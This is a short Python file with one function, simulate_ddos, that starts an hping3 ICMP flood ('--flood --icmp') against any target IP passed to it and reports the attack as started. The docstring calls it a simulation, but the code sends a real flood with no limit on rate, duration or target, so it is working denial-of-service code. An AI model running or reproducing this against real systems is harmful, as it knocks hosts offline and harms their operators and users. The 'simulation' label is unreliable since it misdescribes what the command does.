import subprocess

def simulate_ddos(target_ip):
    """
    Simulates a DDoS attack on the specified target IP.

    Parameters:
    target_ip (str): The target IP address for the DDoS attack.

    Returns:
    str: A message indicating the status of the attack simulation.
    """
    try:
        # Example command to simulate DDoS using hping3
        subprocess.Popen(["hping3", "--flood", "--icmp", target_ip])
        return f"DDoS simulation started on {target_ip}"
    except Exception as e:
        return f"DDoS simulation failed: {str(e)}"